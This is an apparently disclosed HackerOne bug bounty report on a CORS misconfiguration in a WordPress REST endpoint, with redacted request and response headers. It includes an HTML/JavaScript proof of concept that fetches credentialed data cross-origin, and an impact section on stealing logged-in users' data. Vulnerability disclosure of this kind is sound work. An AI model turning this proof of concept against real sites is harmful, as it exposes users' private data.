# CORS Misconfiguration on  █████

## Report Details
- **Report ID**: 2332728
- **URL**: https://hackerone.com/reports/2332728
- **State**: Closed
- **Severity**: low
- **Submitted**: 2024-01-24T13:17:19.948Z
- **Disclosed**: 2024-01-31T13:54:14.230Z

## Reporter
- **Username**: 2k_hacker
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: publitas

## Vulnerability Information
Summary:
An cross-origin resource sharing (CORS) policy controls whether and how content running on other domains can perform two-way interaction with the domain that publishes the policy. The policy is fine-grained and can apply access controls per-request based on the URL and other features of the request. If the site specifies the header Access-Control-Allow-Credentials: true, third-party sites may be able to carry out privileged actions and retrieve sensitive information. This bug could be used to steal users information or force the user to execute unwanted actions. As long that a legit and logged in user is lure to access a attacker controlled HTML page
Steps To Reproduce:
1. visit ███

2.Request:

GET ███wp-json███ HTTP███2
Host: ███████
Origin: ███
Cookie: ██████
User-Agent: Mozilla███5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko███████████ Firefox██████████121.0
Accept: *████*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Sec-Purpose: prefetch
Referer: ████████
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-origin
Te: trailers



Response:

HTTP██████████2 200 OK
Date: ████████ ██████ GMT
Content-Type: application████json; charset=UTF-8
Cf-Ray: 84a84c179f6b17b4-MAA
Cf-Cache-Status: MISS
Access-Control-Allow-Origin: ████
Allow: GET
Cache-Control: public, max-age=0, s-maxage=2592000
Last-Modified: ██████████ ██████████ GMT
Link: <█████>; rel="█████"
Strict-Transport-Security: max-age=63072000
Vary: Accept-Encoding, Origin
Access-Control-Allow-Credentials: true
Access-Control-Allow-Headers: Authorization, X-WP-Nonce, Content-Disposition, Content-MD5, Content-Type, X-HTTP-Method-Override
Access-Control-Allow-Methods: OPTIONS, GET, POST, PUT, PATCH, DELETE
Access-Control-Expose-Headers: X-WP-Total, X-WP-TotalPages, Link
Cache-Tag: d0c98d67-2142-45ee-954b-1652d3db1a93,fa5143bd373309212ef342e7c36d3fda7a55c64c19ac2d96e87806793ef0932a
Content-Security-Policy: frame-ancestors ████
Ki-Cache-Tag: d0c98d67-2142-45ee-954b-1652d3db1a93,fa5143bd373309212ef342e7c36d3fda7a55c64c19ac2d96e87806793ef0932a
Ki-Cache-Type: Edge
Ki-Cf-Cache-Status: SAVING
Ki-Edge: v=20.2.6;mv=3.0.2
Ki-Origin: g1p
X-Content-Type-Options: nosniff
X-Edge-Location-Klb: 1
X-Frame-Options: SAMEORIGIN
X-Kinsta-Cache: HIT
X-Robots-Tag: noindex
X-Xss-Protection: 1; mode=block
Report-To: {"endpoints":[{"url":"████\████████report\██████████v3?s=uvZk8ldCAmNz0%2F9Xef5wFWaUlBaHropQljH0tc8ZmEqnRuk0mzHwH8vv8EwfDONYj1KFENko4G33KbzoNZ1sZ4tFcTACe4%2Bey7nv%2FwVpxWfSHRYCd3UK4NxREMnLTg1GXR0%3D"}],"group":"cf-nel","max_age":604800}
Nel: {"success_fraction":0.01,"report_to":"cf-nel","max_age":604800}
Server: cloudflare
Alt-Svc: h3=":443"; ma=86400
 and some json codes...


Note:by adding the Like repose from the page in the following code developed it can be exploded

code:

<!DOCTYPE html>
<html>
    <head>
        <script>
            function cors() {
                var xhttp=new XMLHttpRequest();
                    xhttp.onreadystatechange= function() {
                        if (this.readyState == 4 && this.status ==200){
                            document.getElementById("emo").innerHTML=alert(this.responseText
                                );
                       }
                };
                xhttp.open('GET',"████",true);
                xhttp.withCredentials=true;
               xhttp.send();
            }
        <████script>
    <██████████head>
    <body>
        <center>
        <h2>[!]CORS PoC Exploit!!!<███h2>
        <div id="demo">
            <button type="button" onclick="cors()">Exploit<███████button> 
        <████div>
        <██████████center>
    <████body>
<███html>

I have the PoC attached which is the output for the above

## Impact

1.Attacker would treat many victims to visit attacker's website, if victim is logged in, then his personal information is recorded in attacker's server.
2.Also If the site specifies the header Access-Control-Allow-Credentials: true, third-party sites may be able to carry out privileged actions and retrieve sensitive information.

## Attachments
No attachments
